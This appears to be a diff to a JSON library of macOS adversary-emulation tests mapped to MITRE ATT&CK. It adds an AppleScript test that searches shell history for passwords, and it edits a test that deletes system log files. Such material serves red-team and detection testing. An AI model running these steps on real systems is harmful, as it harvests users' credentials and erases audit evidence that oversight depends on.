@@ -143,6 +143,17 @@
     "test_number": 2
   },
   {
+    "name": "Search for passwords in history files",
+    "command": "set homeDir to (path to home folder as text)\nset historyPath to homeDir & \"#{filename}\"\n\ntry\n    set fileContent to read file historyPath\n    set lineList to paragraphs of fileContent\n    set matchCount to 0\n    set matchList to {}\n\n    repeat with currentLine in lineList\n        set lineText to currentLine as string\n\n        if lineText starts with \": \" and lineText contains \";\" then\n            set semicolonPos to offset of \";\" in lineText\n            if semicolonPos > 0 then\n                set lineText to text (semicolonPos + 1) thru -1 of lineText\n            end if\n        end if\n\n        if lineText contains \"#{searchTerm}\" then\n            set matchCount to matchCount + 1\n            if matchCount ≤ 10 then\n                set end of matchList to lineText\n            end if\n        end if\n    end repeat\n\n    return \"Found \" & matchCount & \" matches:\" & return & (matchList as string)\non error errMsg\n    return \"Error: \" & errMsg\nend try\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": false,
+    "description": "This test searches for passwords in the bash history file.",
+    "technique_id": "T1552.003",
+    "technique_name": "Unsecured Credentials: Bash History",
+    "test_number": 1
+  },
+  {
     "name": "Get all processes",
     "command": "tell application \"System Events\" to get name of every process\n",
     "language": "AppleScript",
@@ -419,7 +430,7 @@
   },
   {
     "name": "Delete system log files",
-    "command": "tell application \"Finder\" to delete POSIX file \"#{system_log_path}\"'\n",
+    "command": "tell application \"Finder\" to delete POSIX file \"#{logPath}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
     "tcc_required": true,
